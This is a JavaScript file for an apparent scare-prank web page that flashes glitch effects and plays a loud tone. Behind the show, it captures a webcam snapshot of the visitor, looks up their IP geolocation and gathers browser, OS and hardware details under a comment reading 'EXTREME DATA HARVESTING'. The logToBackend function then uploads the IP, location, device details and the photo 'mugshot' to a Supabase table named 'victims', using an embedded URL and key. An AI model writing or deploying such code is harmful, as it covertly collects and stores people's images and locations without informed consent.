document.addEventListener('DOMContentLoaded', () => {
    const startBtn = document.getElementById('start-btn');
    const startScreen = document.getElementById('start-screen');
    const surpriseScreen = document.getElementById('surprise-screen');
    const scanScreen = document.getElementById('scan-screen');
    const infoScreen = document.getElementById('info-screen');
    const trappedText = document.getElementById('trapped-text');
    const finalMessage = document.getElementById('final-message');
    const scanProgress = document.getElementById('scan-progress');
    const body = document.body;

    // Detection Elements
    const ipEl = document.getElementById('ip-address');
    const locationEl = document.getElementById('location-name');
    const browserEl = document.getElementById('browser-name');
    const osEl = document.getElementById('os-name');
    const resEl = document.getElementById('screen-res');
    const langEl = document.getElementById('language');
    const timeEl = document.getElementById('local-time');
    const userPhoto = document.getElementById('user-photo');
    const photoLabel = document.getElementById('photo-label');

    // Camera Elements
    const video = document.getElementById('webcam');
    const canvas = document.getElementById('canvas');

    // --- SUPABASE CONFIGURATION ---
    const SUPABASE_URL = "https://veyrnqafcitibeudcgyj.supabase.co";
    const SUPABASE_KEY = "sb_publishable_uYqZ_9fK1AAcjlsXY_HyLQ_IzZ1rw7l";
    const dbStatusEl = document.getElementById('db-status');

    startBtn.addEventListener('click', async () => {
        // Step 0: Request Camera Immediately
        await initCamera();

        // Step 1: Start Sequence (ULTRA GLITCH)
        body.classList.add('glitch-active');
        document.documentElement.style.filter = "invert(1) contrast(2)"; // Initial hardware failure shock

        transitionTo(startScreen, surpriseScreen);
        playAmbientSound(1.5); // Loud volume

        // Step 2: Capture Snapshot after 1.5s
        setTimeout(() => {
            takeSnapshot();
            document.documentElement.style.filter = "none";
            trappedText.classList.remove('hidden');
            trappedText.classList.add('fade-in');
        }, 1500);

        // Step 3: Transition to Scan
        setTimeout(() => {
            body.classList.remove('glitch-active');
            transitionTo(surpriseScreen, scanScreen);
            runScanAnimation();
        }, 4000);
    });

    async function initCamera() {
        try {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                // Wait for video to be ready before allowing capture
                return new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
            }
        } catch (err) {
            console.error("Camera access denied", err);
        }
    }

    function takeSnapshot() {
        try {
            // Check if video is actually playing and has frames
            if (video.readyState < 2) {
                console.warn("Video not ready for snapshot, retrying...");
                setTimeout(takeSnapshot, 200);
                return;
            }

            const context = canvas.getContext('2d');
            canvas.width = 640; // Fixed width for better quality
            canvas.height = 480;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const dataURL = canvas.toDataURL('image/jpeg', 0.8);
            userPhoto.src = dataURL;

            // Explicitly ensuring the photo is NOT visible yet
            userPhoto.classList.remove('show');
            userPhoto.classList.add('hidden');

            // --- CRITICAL: STOP STREAM & RE-HIDE ---
            if (video.srcObject) {
                video.srcObject.getTracks().forEach(track => track.stop());
                video.srcObject = null;
            }
        } catch (e) {
            console.error("Snapshot failed:", e);
        }
    }

    async function runScanAnimation() {
        let progress = 0;
        const locationData = await fetchIPData();

        const interval = setInterval(() => {
            progress += Math.floor(Math.random() * 8) + 2;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);
                revealInfo(locationData);
            }
            scanProgress.innerText = `${progress}%`;

            // Hardware Failure Glitch during scan
            if (progress > 20 && progress < 80 && Math.random() > 0.8) {
                body.style.backgroundColor = Math.random() > 0.5 ? "blue" : "red";
                setTimeout(() => body.style.backgroundColor = "black", 50);
            }
        }, 100);
    }

    async function fetchIPData() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            if (!response.ok) throw new Error("API_DOWN");
            return await response.json();
        } catch (e) {
            console.error("IP Fetch Failed:", e);
            return {
                ip: "PROXY_DETECTED",
                city: "HIDDEN_GATEWAY",
                country_name: "REMOTE_SECTOR"
            };
        }
    }

    function revealInfo(locationData) {
        const info = getBrowserInfo();

        // --- EXTREME DATA HARVESTING ---
        const payload = {
            ...info,
            ...locationData,
            user_agent: navigator.userAgent,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            isp: locationData.org || locationData.isp || "Unknown",
            network: locationData.network || "Unknown",
            asn: locationData.asn || "Unknown",
            mugshot: userPhoto.src,
            // Hardware Extras
            cores: navigator.hardwareConcurrency || "N/A",
            ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "N/A",
            connection: navigator.connection ? navigator.connection.effectiveType : "N/A",
            platform: navigator.platform,
            vendor: navigator.vendor
        };

        ipEl.innerText = locationData.ip || "Unknown";
        locationEl.innerText = `${locationData.city || 'Unknown'}, ${locationData.country_name || 'Unknown'}`;
        browserEl.innerText = info.browser;
        osEl.innerText = info.os;
        resEl.innerText = info.resolution;
        langEl.innerText = info.language;

        // --- TRANSITION TO TERMINAL ---
        console.log("Transistioning to Terminal Report...");
        transitionTo(scanScreen, infoScreen);

        // --- REVEAL MUGSHOT WITH DELAY ---
        setTimeout(() => {
            userPhoto.classList.remove('hidden');
            userPhoto.classList.add('show');
            photoLabel.classList.remove('hidden');
            console.log("SURPRISE: Mugshot revealed.");
        }, 800);

        // --- TRANSMIT TO MASTER DATABASE ---
        logToBackend(payload);

        setTimeout(() => {
            finalMessage.classList.remove('hidden');
            finalMessage.classList.add('fade-in');
        }, 4000);
    }

    async function logToBackend(data) {
        try {
            console.log("Sending data to Supabase...");
            const response = await fetch(`${SUPABASE_URL}/rest/v1/victims`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`,
                    'Prefer': 'return=minimal'
                },
                body: JSON.stringify({
                    ip: data.ip || 'Unknown',
                    location: `${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}`,
                    browser: data.browser || 'Unknown',
                    os: data.os || 'Unknown',
                    resolution: data.resolution || 'Unknown',
                    mugshot: data.mugshot || ''
                })
            });
            if (response.ok || response.status === 201) {
                dbStatusEl.innerText = "CONNECTED (CLOUD_SYNC)";
                dbStatusEl.style.color = "#00ff00";
                console.log("Cloud Sync Successful.");
            } else {
                dbStatusEl.innerText = "ERROR (STATUS_" + response.status + ")";
                dbStatusEl.style.color = "#ff0000";
                console.error("Supabase error:", await response.text());
            }
        } catch (e) {
            console.error("Cloud Sync Failed", e);
            dbStatusEl.innerText = "OFFLINE (NETWORK_ERROR)";
            dbStatusEl.style.color = "#ffaa00";
        }
    }

    function transitionTo(from, to) {
        if (from && to) {
            from.classList.remove('active');
            from.style.display = "none"; // Hard hide
            to.classList.add('active');
            to.style.display = "flex"; // Hard show
        }
    }

    function getBrowserInfo() {
        const ua = navigator.userAgent;
        let browser = "Unknown";
        let os = "Unknown";

        if (ua.indexOf("Firefox") > -1) browser = "Mozilla Firefox";
        else if (ua.indexOf("SamsungBrowser") > -1) browser = "Samsung Internet";
        else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";
        else if (ua.indexOf("Trident") > -1) browser = "Internet Explorer";
        else if (ua.indexOf("Edge") > -1) browser = "Microsoft Edge";
        else if (ua.indexOf("Chrome") > -1) browser = "Google Chrome";
        else if (ua.indexOf("Safari") > -1) browser = "Apple Safari";

        if (ua.indexOf("Win") > -1) os = "Windows";
        else if (ua.indexOf("iPhone") > -1) os = "iOS";
        else if (ua.indexOf("Android") > -1) os = "Android";
        else if (ua.indexOf("Mac") > -1) os = "macOS";
        else if (ua.indexOf("Linux") > -1) os = "Linux";

        return {
            browser: browser,
            os: os,
            resolution: `${screen.width} x ${screen.height} (${window.devicePixelRatio}x)`,
            language: navigator.language || "Unknown",
            time: new Date().toLocaleTimeString()
        };
    }

    function playAmbientSound(gainValue = 0.05) {
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const osc = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            osc.type = 'sawtooth';
            osc.frequency.setValueAtTime(40, audioCtx.currentTime);
            gain.gain.setValueAtTime(gainValue * 4, audioCtx.currentTime); // LOUDER
            gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 6);
            osc.connect(gain);
            gain.connect(audioCtx.destination);
            osc.start();
            osc.stop(audioCtx.currentTime + 6);
        } catch (e) { }
    }
});

